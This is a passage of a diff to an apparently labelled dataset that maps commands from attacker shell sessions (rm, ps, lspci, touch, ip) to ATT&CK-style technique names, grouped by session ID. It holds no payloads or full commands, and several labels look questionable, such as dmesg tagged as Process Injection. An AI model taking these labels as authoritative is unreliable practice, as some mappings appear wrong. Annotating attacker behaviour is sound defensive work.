+ip	show / manipulate routing, network devices, interfaces and tunnels	System Network Configuration Discovery
 uname	print system information	System Information Discovery
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
@@ -35280,24 +34816,19 @@ config	OpenSSL CONF library configuration files	Obfuscated Files or Information
 echo	display a line of text	Masquerading
 cat	concatenate files and print on the standard output	Automated Collection
 
-- Mapping:		System Information Discovery
-- Mapping:		File and Directory Discovery
+- Mapping:		System Network Configuration Discovery
+- Mapping:		System Network Connections Discovery
 
 Session ID: c97094aa144d
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: c2de31a09cd3
 killall	kill processes by name	Process Discovery
@@ -35327,7 +34858,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 66e0d044e61f
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -35375,35 +34906,25 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 4f73b4310e03
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 5f6d58f47875
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 2ff78d7fdc2d
 cat	concatenate files and print on the standard output	Automated Collection
@@ -35453,35 +34974,25 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: fef09a0f8b42
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 0e36c7ffc897
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 3702533ec299
 cat	concatenate files and print on the standard output	Automated Collection
@@ -39452,9 +38963,7 @@ rm	remove files or directories	Indicator Removal
 - Mapping:		System Information Discovery
 
 Session ID: abd0ad3d0016
-
-
-ip
+ip	show / manipulate routing, network devices, interfaces and tunnels	System Network Configuration Discovery
 uname	print system information	System Information Discovery
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
@@ -39468,8 +38977,8 @@ config	OpenSSL CONF library configuration files	Obfuscated Files or Information
 echo	display a line of text	Masquerading
 cat	concatenate files and print on the standard output	Automated Collection
 
-- Mapping:		System Information Discovery
-- Mapping:		File and Directory Discovery
+- Mapping:		System Network Configuration Discovery
+- Mapping:		System Network Connections Discovery
 
 Session ID: 0de6319f7c68
 cat	concatenate files and print on the standard output	Automated Collection
@@ -41336,7 +40845,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: e3ba7affffdb
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -41568,19 +41077,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: f30d2676a86c
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 1d6f7ee021cd
 cat	concatenate files and print on the standard output	Automated Collection
@@ -43266,7 +42770,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: eb09f66919c9
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -43452,19 +42956,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 96c0aa3d3f4c
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: f299564613e8
 cat	concatenate files and print on the standard output	Automated Collection
@@ -44955,19 +44454,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 7ad7f406d96f
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 3339fc298af0
 killall	kill processes by name	Process Discovery
@@ -44997,7 +44491,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: cdd6fd484fc0
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -46791,7 +46285,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: aaf32ef43990
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -47115,19 +46609,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 98a0593205cf
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: bd21c465b976
 cat	concatenate files and print on the standard output	Automated Collection
@@ -48280,9 +47769,7 @@ rm	remove files or directories	Indicator Removal
 - Mapping:		System Information Discovery
 
 Session ID: 59b9a5dd38cf
-
-
-ip
+ip	show / manipulate routing, network devices, interfaces and tunnels	System Network Configuration Discovery
 uname	print system information	System Information Discovery
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
@@ -48296,8 +47783,8 @@ config	OpenSSL CONF library configuration files	Obfuscated Files or Information
 echo	display a line of text	Masquerading
 cat	concatenate files and print on the standard output	Automated Collection
 
-- Mapping:		System Information Discovery
-- Mapping:		File and Directory Discovery
+- Mapping:		System Network Configuration Discovery
+- Mapping:		System Network Connections Discovery
 
 Session ID: 114c67df017c
 cat	concatenate files and print on the standard output	Automated Collection
@@ -51115,9 +50602,7 @@ rm	remove files or directories	Indicator Removal
 - Mapping:		System Information Discovery
 
 Session ID: 914bd8767ff6
-
-
-ip
+ip	show / manipulate routing, network devices, interfaces and tunnels	System Network Configuration Discovery
 uname	print system information	System Information Discovery
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
@@ -51131,13 +50616,11 @@ config	OpenSSL CONF library configuration files	Obfuscated Files or Information
 echo	display a line of text	Masquerading
 cat	concatenate files and print on the standard output	Automated Collection
 
-- Mapping:		System Information Discovery
-- Mapping:		File and Directory Discovery
+- Mapping:		System Network Configuration Discovery
+- Mapping:		System Network Connections Discovery
 
 Session ID: 4a2659040bcb
-
-
-ip
+ip	show / manipulate routing, network devices, interfaces and tunnels	System Network Configuration Discovery
 uname	print system information	System Information Discovery
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
@@ -51151,8 +50634,8 @@ config	OpenSSL CONF library configuration files	Obfuscated Files or Information
 echo	display a line of text	Masquerading
 cat	concatenate files and print on the standard output	Automated Collection
 
-- Mapping:		System Information Discovery
-- Mapping:		File and Directory Discovery
+- Mapping:		System Network Configuration Discovery
+- Mapping:		System Network Connections Discovery
 
 Session ID: 158469bb48e7
 cat	concatenate files and print on the standard output	Automated Collection
@@ -51650,7 +51133,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: e8d511f86841
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -51744,19 +51227,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 8fcebedfad53
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: fd90369164bd
 cat	concatenate files and print on the standard output	Automated Collection
